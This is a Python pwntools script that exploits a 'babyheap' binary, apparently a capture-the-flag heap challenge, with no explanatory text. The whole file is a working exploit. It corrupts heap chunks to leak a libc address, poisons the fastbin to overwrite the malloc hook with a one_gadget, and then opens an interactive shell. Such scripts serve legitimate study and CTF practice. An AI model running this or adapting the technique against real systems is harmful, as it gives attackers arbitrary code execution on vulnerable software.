#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./babyheap"
ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process(elf)

def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)

def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()

# 
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)


free(1)
free(2)

payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)

payload = p64(0)*3
payload += p64(0x21)
fill(3, payload)

alloc(0x10)
alloc(0x10)

payload = p64(0)*3
payload += p64(0x91)
fill(3, payload)
alloc(0x80)

free(4)
libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78
log.info("libc_base: "+hex(libc_base))

alloc(0x60)
free(4)

payload = p64(libc_base + 0x3c4aed)
fill(2, payload)

# gdb.attach(p)
alloc(0x60)
alloc(0x60)

payload = p8(0) * 3
payload += p64(0)*2
payload += p64(libc_base + 0x4526a)  #0x4526a is generated one_gadget
fill(6, payload)

alloc(255)
p.interactive()
